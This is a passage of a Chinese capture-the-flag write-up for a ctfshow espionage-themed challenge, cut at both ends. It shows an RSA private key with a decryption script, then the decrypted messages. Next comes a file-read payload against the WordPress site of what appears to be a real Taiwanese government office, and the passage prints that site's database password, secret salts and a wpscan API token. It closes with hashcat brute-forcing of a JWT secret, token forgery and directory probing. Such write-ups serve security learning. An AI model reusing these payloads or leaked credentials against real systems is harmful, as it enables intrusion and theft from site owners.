class="line">Lg8oz8igNHm2t1/t07vKgkQiZjL/KX/4qEcYwAKN20/V8FSfgjxPskjwiIExKpwh</span><br><span class="line">ca2mMArH/Ye+dMy+zti3oU4ovaLNL5Qff1Gt5TQy+5uFbB8/HmZtb/n9IqkwrCqT</span><br><span class="line">G0z79mA7Up+vfJcork82+O2P4Ic7iXFOshqnBmjonTRf9h6pl4CsRpFSXZOr848g</span><br><span class="line">QriHAkY+SGpCNUZWYKq4NnL6pBanuX/IcQZhjGEzJz5M4fzWrCqsDM/Gt09FMxzz</span><br><span class="line">gMfb8QKCAQEAhnF+W65yTulKELzLYWv2ngLchOY/xsiBzgTqEaKBahzWrgjGQsly</span><br><span class="line">s2SzPuqk14Ft4Ow3IljHlmomRKut9IuhvBDAP4a3anCJUjNkMMVstYS/9dz7RmY5</span><br><span class="line">W2HQHlRXHgKS4NsGAI/7aehZztYHjaDW+f55zLrIKHPD+3m6weoSyiZcUberAuMa</span><br><span class="line">gOvhmJgGLmPtRzqpOgbEPYOVMo7KhCJqclAq5+OxbVvlhxYsO4RuZBQ8tLqF8iO+</span><br><span class="line">/DychaS4w2yzQFSMTYH8FZhtPnz9usI4L1/zRPLVPF7VoIJG1ZZDgeM4nqqnWyQd</span><br><span class="line">GTcIXXr+wRobItbnIwqM/ZEca4iQWiO3+QKCAQAjp153c8JvZhR3Stan0bKYHzMm</span><br><span class="line">FWEUjmygq6xgzclvkWWYmHwHvYjO4tITXHSmEt5GrUY/W1LOA0x9HRMUh7p71tw6</span><br><span class="line">7ni/lELMlT6Sk3b32SRoftEr5SmNEZlXPh2UYC260FkXNj3hhShv7DAZyV2bthqk</span><br><span class="line">YV63M7neAAU5YPmq0uvMvxHv1D17bswwbiJ3mzb/E4CSR2gDkKrZGshtJbKUtLvb</span><br><span class="line">wEigkCIjw+UFRhLiK4R+OIL7bZtE2unbYWeL1h4w1BLwFJPg/26Gnq91V96GwoKf</span><br><span class="line">JiAEy9wfJBnCwJPdr9OV9GGrMfBRF8Rkl6YyvNNb21C6ZABBuAzWpfu0I60h</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure><p><strong>用私钥解密，解密脚本</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> serialization</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.asymmetric <span class="keyword">import</span> padding</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> hashes</span><br><span class="line"></span><br><span class="line">message=&#123;</span><br><span class="line">    <span class="string">&quot;inputMessage_20241216&quot;</span>:<span class="string">&#x27;&#x27;&#x27;gHgAsclUVPhWDv4S8Oa8SuRTDaj+V0dI4z2jrQwfvfSFWilWwMKwNULUI48UBLS2shZcm/yv2/e5Hq5VRDfXkdxCYQMdvdnvONtpm2yNiIaLpDV4Rs8fOXJ6kcaeT+mg4RkIIFgx35w4J1KgO72pSP8j1p+R9f9TNMafwJ91XmO4QTcOYkMKQMddKvhbyMXzJkSS0uZqEppNSIUnVX9b7m8PmMjV0uHShvb1Zc8UQWJWUJ3cOxwNasOeMQGxJrZXPkxIxDYzm3f0tXbCgvdgNZ8TQY7u+iCXjOtD6xnUsdSahnPq14BD30CilIfsG0r/klPHfxQ+psmHSX47Ylai0TtgfbHWJJ4lSo0ojMvTx6HYK8zmAoCmg4OGXDbv/IjJgYU1w24na0iXZCNtcjB9MLRNck00c20f/uS64Ss0Ixii8nmfsFOjQBCcIYN+HGmOnj5Uw8DVJrxlOmcfQciG3rzuIvYlbOdGMcyarTy2Ba7iZfoovYZObPscAwhNLWqbU4tuR78aOVxiXTFRY7+Y0x2eRT5sulcvB3vsKuDMlNrxaUgiFUohPBZGNsgQgyCPxxqk0NpUn0bbHLH+vBebjJxaim4AU28ctWW8xv7xpxVttb0EoohtK2cIHr79ep5XrU/rv4R58obD/o+QqI1Mrb4wwpX9tsL7ZbROw/MXJwM=&#x27;&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;inputMessage_20240411&quot;</span>:<span class="string">&#x27;&#x27;&#x27;Z93Khatj+AWZcpPwIqu8LzbJ8xb8CuVMI8okE0qwoQD2IC2lixg77mJZireOrbW7zFkDsk1hP67dROJZwVUDrYot2g5GxX/xy7lGjIblUX4iJVUtP4mHqZUgKROaLoh/gippMpP+8Ik2X/QRBx5gdhq0xam+wuVC+77/tyu8Fd/DohKbAMp8aaJsFr/W4mLDZ1gv4JK+2O3l+bAvpodBRTzb0ld5zD2ueYvjTudoDjdanQP1oVTH7pkDO2Vb+SsdIyTi2C410JEOF4Qm8mzVHtiOunOcLVpAlQsM6/LdhqsTNelXl/Myb84NGxwGWVmx6j2QejiL7S1hHeHlmQ9ExHeURPdZAvKhgMCemYXu3BGlFq3ydb5SkqwLFvM4vJ6XUBcWkHT8eijBFF6Y7YgOv9GRvBTnsAQhUBp4W4EAMtXkDdToG+S8ZO7El8Gh8jaWC49n5CuUBRz3z2GeOVbsBamfLV06IO5v78jGHXig4saEFKHvYSIGewyUCVQEGoIR5xOTJBTUTePAdvQjfg28vZZxFB/hIYNDUHkaek1Mg1UH5HWGgsCX1In5hSX/9eBkznEhzeWnJ1yMsYkj+ddN34DLQSrHc83geXMcoW3Ah3cAQG8E8bszvKL3hme+T5rOeENjkOAgYhf84k4YlxDskdwvzyu8HkE9CSaBpDP6lKI=&#x27;&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;inputMessage_20240305&quot;</span>:<span class="string">&#x27;&#x27;&#x27;ckDSthpl5DDJMpBE26Jqk8EjaSq7MUntdwLHPouwx6D38un6WQfLJ9wgDyjh9GA/ICJR7WrwWsVinr6y3u9w+ubMZ0mqmtnphzQraagk8NkKc1u1+qGp8llsud3C8mvJWa4GYa9KEhnACDHwppPKJDCfr1HKwPbR0NIi+1Aunmy6DeOKRkFwysnrSco5QiiC9+gdXFhQDmN9KEiYW6Pc3mWVbqFiJgRW3/Df6638oGPm6AUcgRnEWMKiluyN81frM9VNtCeJ64YrU6Rgx4D153YxNNQbLTcyCQMamHTrJnhxPojkuDqbEcU+iiN4offwrQyr4eEu9ecvmyD2w/n7pAOsVnqSzroBujVA+CK6Zq8Uie15mL5yWG9hD5ZcbSwnRmtqK3yl0Xl91hgn1JqcIEKtf+MnMQPr80uoxT3mz8IX8pyVnyyw1x6F+IK1I2G+5w6rUDjhzIbME5XB9hopwcswsXrMo9PP6/5Sz1noJrsu6k6WN8ZM0MyRIav+xuKP1+cYzlPSQZrMo3L4ieHQnBbsoyzGVf9QONMwaooGOrxu88ZWlGe8e7eyCzteeNSVOC2zqtQiwQJIgfp2UwTymA/cEjOICWVzUXwbE5wWUBPCLp2C/XWc82byrOHAFXHLOVKgolVToUpZ5uOvizgk/ahaxdGxGa9CrRyr6sf+goA=&#x27;&#x27;&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">backend=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">-----BEGIN RSA PRIVATE KEY-----</span></span><br><span class="line"><span class="string">MIIJKQIBAAKCAgEAmziayo9Tddo1FYdrtOswyjLYJ5frYKEwm4rQTsKU8UcdnnDR</span></span><br><span class="line"><span class="string">gms+ZmStoqlH/qi6x+D1K3fvvioCnGZLFHZwBUqbgT5x+qUmUaVMll9FOT7ZJ05w</span></span><br><span class="line"><span class="string">8n8Ljqa1akzFMU5G7YbCr3vQwN63vwvD9/63TDbXkJrv1fGl2rHpPwp5OPCUeCB3</span></span><br><span class="line"><span class="string">nIFIRCWHpJU7sHJqIP5vzV8KNJtbxgR+dhszdg+NhoBDUpxoVN5lzSKr2TMOLFLZ</span></span><br><span class="line"><span class="string">aQR9AWOV/aHV8gjTkTLDZfc+XlfhxiDMTQdiUTbk/tynpt+JFrDA8vL5/TOmuxgu</span></span><br><span class="line"><span class="string">mqgXZIPGrIUbwloTYyHD/XXmvXu5KE8g3eMKgxNxuEKM5bMTESBK9A7Q2Kj3eNp0</span></span><br><span class="line"><span class="string">Rvb5Aleg7h8/YbQemGelY/o5xpUyHgHjsfNQ3j/xhdhVCNVaXZF64V/YVpvC9Cq2</span></span><br><span class="line"><span class="string">9F7qI+bl6FlN7zSpuHB3QgNS1uXOmjBCsA7ypZoWmdXeaLIO+I3kP48BBSmue4ni</span></span><br><span class="line"><span class="string">dJifiK/kSOcZ0iegRXV1hyZ6pYdDE7hM5V5t5tvayJ31zRQNT2ALAFeCDozVWELH</span></span><br><span class="line"><span class="string">TnphkPkQO+SOPglrVz0S1dXicqRofXWMj7PJOFkBpWIX0aywMIh1woEAawUs3RM2</span></span><br><span class="line"><span class="string">pfLUNtqUTfodSCmWlwcpGrBWG5NACx7csPFtzWn8oPZfzL346at5DDIwD2kCAwEA</span></span><br><span class="line"><span class="string">AQKCAgA+oGYD2DQqVrIYT50rT8FNs5n2z5rOT/rWpvlI7cU+XB0dMhO19SMmGPTd</span></span><br><span class="line"><span class="string">rkM4AkfqIV+J/Egkh7qp87PTO74SxHldeh5urHd7daAjA6lgYXUoIMP9czjsg2Kq</span></span><br><span class="line"><span class="string">0vK05ApGB5tBRkmBp9qnIE4fHwxBmdb7pyehQHBUfnfHUah7SsX8ec0Ivji0FhhW</span></span><br><span class="line"><span class="string">VUfR9zfOvBnL2M67TvuGN4X2jR8EQV4uqE2BZU3LADg+vgBsD+dmBr9lWcQ97To1</span></span><br><span class="line"><span class="string">LTivANSrvrmLyGfHlNmpIM6NPa9zaRyXn9ucvpAHMaWH4HTwrghVcHpNOAjIK0rb</span></span><br><span class="line"><span class="string">jJEYp1MvKg5zk0BXrzWTh+mQ3Ov+NXrbdDspmeZsY02SuyPheOBHHHs7cHANPcRH</span></span><br><span class="line"><span class="string">1Nl/nxXkRF9H+oSOmTQi7wjZbhrEFFCeCK2TuT8vyf0p+lQMPEc+cAFn5rSXnhii</span></span><br><span class="line"><span class="string">W2Mq6nwx5Nbllr/hj7oVeyGrUZFskvbZnYYVM4NTFqUPBzQbBuQTGGfccZc9OrJx</span></span><br><span class="line"><span class="string">2qpDZdUknQe9ZI742c2vZRTqY2yZX6InR8JoQbmscke4LRdUMHH6G/PbfkqPXfFy</span></span><br><span class="line"><span class="string">r5mxscghP+kRFj86dyL03CB039N23xCNezK/AGE/6JzJgwpvUPaYtvnIuhSFQEmH</span></span><br><span class="line"><span class="string">DGrYYrDXSbwTT0ufM/tIEuHMHXT4DYX3nm94SG8wB/b3zpFdAQKCAQEA+56kjWCg</span></span><br><span class="line"><span class="string">Wcjo+QUgp50+BIa5hkFoV16QOCQEsqh+s5rhVMke7svuo5+U6C/rNFIkpR1iKRPL</span></span><br><span class="line"><span class="string">3LOqJ8B5P7ZAPdhbHAPjdtnUDbPzM1r0RYpjbJPh4AcRVqhDTWy20Yd7iZN9mHxH</span></span><br><span class="line"><span class="string">SKBZ4Txn20gvkHamPVlPMejsDRpDoauS/euzn2GlG9GPq7i5vHwQiy6sYZAPm9Ey</span></span><br><span class="line"><span class="string">z+XxsQNiqB32tHnZqYrj/GS64Jx6eaa5MdSCLIPkHHWAUHzBQ5A8/bNTFf8VAYri</span></span><br><span class="line"><span class="string">R9GnTZF8oSNne6oD62IYVzDH2wWOWSnUKdAdsnaahJLvHQnWbz6itWPWj+2TrjLS</span></span><br><span class="line"><span class="string">nl9Tz7uuhrRjcQKCAQEAnexbL5Sov7N4W7BrZZao8cKEnM6goDpUjqgEnlIG4FF+</span></span><br><span class="line"><span class="string">UVmBzuAYNlLjOXW7fKK6nt5q95R1AA72FpfOHbZnTTYHm9u1zUecIeuvNVjxi9sw</span></span><br><span class="line"><span class="string">hmhMn43pxaQcUfgWSsCrqH+8SrVEz8Lc7V2lbswx/V94PC8Za7ZLSr+FOz6X7C71</span></span><br><span class="line"><span class="string">sLQR8XI3SkrZIkmL150N8LO4WdKAtKKIfvz7Lo2xLxpGLNJ3Xf/NW51wMs5BwQNz</span></span><br><span class="line"><span class="string">EUWRUmkgCmeU74m47TCSOj580qLLT0Hxj1jRhecZOs0DHqDCeHt0hz82EtOcw1TB</span></span><br><span class="line"><span class="string">JKTly3Xj/UjGRpzEmo8rAuU8XoKc/NkmaZCjpxh/eQKCAQEArbI5E+OFLhXURbs1</span></span><br><span class="line"><span class="string">bJ/OpR8/yR8z4URFOIwcthw8ws2DCZ2A/gXHaiqKh7I0oryl0Vm0Xnjs/SEFsEVd</span></span><br><span class="line"><span class="string">Lg8oz8igNHm2t1/t07vKgkQiZjL/KX/4qEcYwAKN20/V8FSfgjxPskjwiIExKpwh</span></span><br><span class="line"><span class="string">ca2mMArH/Ye+dMy+zti3oU4ovaLNL5Qff1Gt5TQy+5uFbB8/HmZtb/n9IqkwrCqT</span></span><br><span class="line"><span class="string">G0z79mA7Up+vfJcork82+O2P4Ic7iXFOshqnBmjonTRf9h6pl4CsRpFSXZOr848g</span></span><br><span class="line"><span class="string">QriHAkY+SGpCNUZWYKq4NnL6pBanuX/IcQZhjGEzJz5M4fzWrCqsDM/Gt09FMxzz</span></span><br><span class="line"><span class="string">gMfb8QKCAQEAhnF+W65yTulKELzLYWv2ngLchOY/xsiBzgTqEaKBahzWrgjGQsly</span></span><br><span class="line"><span class="string">s2SzPuqk14Ft4Ow3IljHlmomRKut9IuhvBDAP4a3anCJUjNkMMVstYS/9dz7RmY5</span></span><br><span class="line"><span class="string">W2HQHlRXHgKS4NsGAI/7aehZztYHjaDW+f55zLrIKHPD+3m6weoSyiZcUberAuMa</span></span><br><span class="line"><span class="string">gOvhmJgGLmPtRzqpOgbEPYOVMo7KhCJqclAq5+OxbVvlhxYsO4RuZBQ8tLqF8iO+</span></span><br><span class="line"><span class="string">/DychaS4w2yzQFSMTYH8FZhtPnz9usI4L1/zRPLVPF7VoIJG1ZZDgeM4nqqnWyQd</span></span><br><span class="line"><span class="string">GTcIXXr+wRobItbnIwqM/ZEca4iQWiO3+QKCAQAjp153c8JvZhR3Stan0bKYHzMm</span></span><br><span class="line"><span class="string">FWEUjmygq6xgzclvkWWYmHwHvYjO4tITXHSmEt5GrUY/W1LOA0x9HRMUh7p71tw6</span></span><br><span class="line"><span class="string">7ni/lELMlT6Sk3b32SRoftEr5SmNEZlXPh2UYC260FkXNj3hhShv7DAZyV2bthqk</span></span><br><span class="line"><span class="string">YV63M7neAAU5YPmq0uvMvxHv1D17bswwbiJ3mzb/E4CSR2gDkKrZGshtJbKUtLvb</span></span><br><span class="line"><span class="string">wEigkCIjw+UFRhLiK4R+OIL7bZtE2unbYWeL1h4w1BLwFJPg/26Gnq91V96GwoKf</span></span><br><span class="line"><span class="string">JiAEy9wfJBnCwJPdr9OV9GGrMfBRF8Rkl6YyvNNb21C6ZABBuAzWpfu0I60h</span></span><br><span class="line"><span class="string">-----END RSA PRIVATE KEY-----</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_message</span>(<span class="params">encrypted_base64,private_key_pem</span>):</span><br><span class="line">    <span class="comment"># 加载私钥</span></span><br><span class="line">    private_key=serialization.load_pem_private_key(</span><br><span class="line">        private_key_pem.encode(),</span><br><span class="line">        password=<span class="literal">None</span>,</span><br><span class="line">        backend=default_backend()</span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#base64解码密文</span></span><br><span class="line">    encrypted=base64.b64decode(encrypted_base64)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#使用私钥解密</span></span><br><span class="line">    decrypted=private_key.decrypt(</span><br><span class="line">        encrypted,</span><br><span class="line">        padding.OAEP(</span><br><span class="line">            mgf=padding.MGF1(algorithm=hashes.SHA256()),</span><br><span class="line">            algorithm=hashes.SHA256(),</span><br><span class="line">            label=<span class="literal">None</span></span><br><span class="line">        )</span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#解码base64获取原始信息</span></span><br><span class="line">    original_message=base64.b64decode(decrypted).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> original_message</span><br><span class="line"></span><br><span class="line"><span class="comment">#解密所有信息</span></span><br><span class="line"><span class="keyword">for</span> data,encrypted_msg <span class="keyword">in</span> message.items():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n解密<span class="subst">&#123;date&#125;</span>:&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        decrypted=decrypt_message(encrypted_msg,backend)</span><br><span class="line">        <span class="built_in">print</span>(decrypted)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;解密失败:<span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/archives/16d06f93/QQ20250226-201245.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">解密inputMessage_20241216:</span><br><span class="line">Park:</span><br><span class="line">你的行动已经暴露，24小时内迅速撤离，销毁所有资料，将现有资料统一上传到【任务中心】</span><br><span class="line">发送人：Dylan</span><br><span class="line"></span><br><span class="line">解密inputMessage_20240411:</span><br><span class="line">Park:</span><br><span class="line">总部已经为你安排新的身份，请务必在3日内抵台，你的新身份是新竹县动物保护防疫所网络安全顾问，【任务中心】账号密码和你任职单位网站的数据库用户名密码一致，请尽快修改 </span><br><span class="line">发送人：Dylan</span><br><span class="line"></span><br><span class="line">解密inputMessage_20240305:</span><br><span class="line">Park:</span><br><span class="line">【任务中心】网址已变更为 https://task.ctfer.com ，请注意修改浏览器地址栏中的链接 </span><br><span class="line">发送人：Dylan</span><br></pre></td></tr></table></figure><p><code>flag2：ctfshow&#123;https://task.ctfer.com&#125;</code></p><h4 id="潜入敌营"><a href="#潜入敌营" class="headerlink" title="潜入敌营"></a>潜入敌营</h4><p>这里需要<strong>账户密码</strong></p><p>通过<code>你的新身份是新竹县动物保护防疫所网络安全顾问</code>搜索网站。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://apc.hsinch*.g*v.tw/</span><br></pre></td></tr></table></figure><p><img src="/archives/16d06f93/QQ20250226-211349.png"></p><p>可以看到插件是wordpress，利用kali自带<code>wpscan</code>可以扫出漏洞poc，第一次用需要注册登录官网获取token</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url https://apc.hsinch*.g*v.tw/ --api_token sWXaPLV1Doham43h0uiyVIKtTAKh34kIloIo07DAIeY</span><br></pre></td></tr></table></figure><p><img src="/archives/16d06f93/QQ20250226-214515.png"></p><p><img src="/archives/16d06f93/QQ20250226-214607.png"></p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://apc.hsinch*.g*v.tw/?aam-media=wp-config.php</span><br></pre></td></tr></table></figure><p>得到数据库信息：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">define( <span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;hsinchug_wp1&#x27;</span> );</span><br><span class="line"></span><br><span class="line">/** MySQL database username */</span><br><span class="line">define( <span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;hsinchug_wp1&#x27;</span> );</span><br><span class="line"></span><br><span class="line">/** MySQL database password */</span><br><span class="line">define( <span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;Q.4Vyj8VCiedX1KYU5g05&#x27;</span> );</span><br><span class="line"></span><br><span class="line">/** MySQL hostname */</span><br><span class="line">define( <span class="string">&#x27;DB_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span> ); </span><br><span class="line"></span><br><span class="line">define(<span class="string">&#x27;AUTH_KEY&#x27;</span>,         <span class="string">&#x27;o8wpc6n66l270a8axjrmhcy5afl8ttgf8bj9lm3hji103rchpgw88f0wuxjfcwqd&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;SECURE_AUTH_KEY&#x27;</span>,  <span class="string">&#x27;3jbho525q0dabjkgcpkg2yvuncwganxcjas0ikq7drgxa62my8h6tvut4a34pujx&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;LOGGED_IN_KEY&#x27;</span>,    <span class="string">&#x27;1acslrj7hblucj7nnnsvi91t8v77kf8jl7omi5gfc3v8nvca46lndpchjtqd27jq&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;NONCE_KEY&#x27;</span>,        <span class="string">&#x27;b6nacyj0crhfol2hs6gbqx71w957dn9al8hrjgrydf3rora6jcw2olw4sc3736aw&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;AUTH_SALT&#x27;</span>,        <span class="string">&#x27;vl5vc4gy92ciqvbflfc5o4227jabrktlir61urdxal2fgl9xfokt21usbr28625v&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;SECURE_AUTH_SALT&#x27;</span>, <span class="string">&#x27;7qljoppn8bcdggacnvi53616r5iyy4yr7qduyj0up3x1nv1o345t591bitfxod3a&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;LOGGED_IN_SALT&#x27;</span>,   <span class="string">&#x27;g50jlcgt1qyy031blxcahqm1f20jfypw53jxxg83a67c73ir3dod3irbbguis13k&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;NONCE_SALT&#x27;</span>,       <span class="string">&#x27;l5pti50j2wrxwrkclijp66x24r53auvf7kknsq7w733fr18x7my8lawm0p4hgtph&#x27;</span>);</span><br></pre></td></tr></table></figure><p>或者根据插件版本找到payload</p><p><code>flag3：ctfshow&#123;hsinchug_wp1_Q.4Vyj8VCiedX1KYU5g05&#125;</code></p><h3 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h3><h4 id="秘密潜伏"><a href="#秘密潜伏" class="headerlink" title="秘密潜伏"></a>秘密潜伏</h4><p>需要<strong>提交dylan的电话号码</strong></p><p>登录任务中心：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">账号：hsinchug_wp1</span><br><span class="line">密码：Q.4Vyj8VCiedX1KYU5g05</span><br><span class="line">地址：第一章潜入敌营开启的地址</span><br></pre></td></tr></table></figure><p>放了半天只看到一个照片和一串公钥：</p><p><img src="/archives/16d06f93/QQ20250226-222023.png"></p><p><img src="/archives/16d06f93/QQ20250226-222124.png"></p><p>而根据题目中提示的jwt就说的通了，key应该是密钥，我们需要伪造jwt登录dylan的账号：</p><p><img src="/archives/16d06f93/QQ20250226-222700.png"></p><p><img src="/archives/16d06f93/QQ20250226-222714.png"></p><p>利用hashcat将遮挡的字符爆破出来：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 3 -m 16500 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJoc2luY2h1Z193cDEiLCJleHAiOjE3NDA2NjYyNTN9.868RYTiNArIpe3OjqMFKL9XcKzzEIjzMlagbBlw6DT0 --custom-charset1=?l?d 4a4f7d6e8b5?1?1?10c7f </span><br></pre></td></tr></table></figure><p><img src="/archives/16d06f93/"><img src="/archives/16d06f93/QQ20250227-180440.png" alt="QQ20250227-180440"></p><p>密钥为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4a4f7d6e8b5e3a0c7f</span><br></pre></td></tr></table></figure><p><img src="/archives/16d06f93/QQ20250227-181324.png"></p><p>抓显示电话号码的包修改jwt即可：</p><p><img src="/archives/16d06f93/QQ20250227-181411.png"></p><p><code>flag4：ctfshow&#123;117447685307&#125;</code></p><h4 id="收集敌方身份信息"><a href="#收集敌方身份信息" class="headerlink" title="收集敌方身份信息"></a>收集敌方身份信息</h4><p>这里要知道<strong>root的密码</strong></p><p>知道jwt密钥后我们就可以访问<code>https://task.ctfer.com</code>，通过伪造jwt来登录dylan账号</p><p><img src="/archives/16d06f93/QQ20250227-194846.png"></p><p><img src="/archives/16d06f93/QQ20250227-194920.png"></p><p>而在dylan账号中多了一个<code>Administrator</code>，里面有两个路由分别为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/listTaskFiles?path=</span><br><span class="line"></span><br><span class="line">/readTaskFile?path=&amp;file_name=</span><br></pre></td></tr></table></figure><p>第一个路由用于看<strong>指定目录的文件</strong>，而<strong>path参数用来指定目录</strong>：</p><p><img src="/archives/16d06f93/QQ20250227-195259-174065751208622.png"></p><p>同样需要伪造jwt才能访问。</p><p><img src="/archives/16d06f93/QQ20250227-195517.png"></p><p>测试发现过滤了<code>/</code>和<code>\</code>，但没过滤<code>.</code>，所以可以<strong>通过<code>.</code>看当前目录下的文件</strong>：</p><p><img src="/archives/16d06f93/"><img src="/archives/16d06f93/QQ20250227-200130.png" alt="QQ20250227-200130"></p><p>而第二个路由用于<strong>看指定目录的指定文件</strong>，<strong>path指定目录，file_name指定文件</strong>：</p><p><img src="/archives/16d06f93/QQ20250227-201124.png"></p><p>main.py.bak:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span 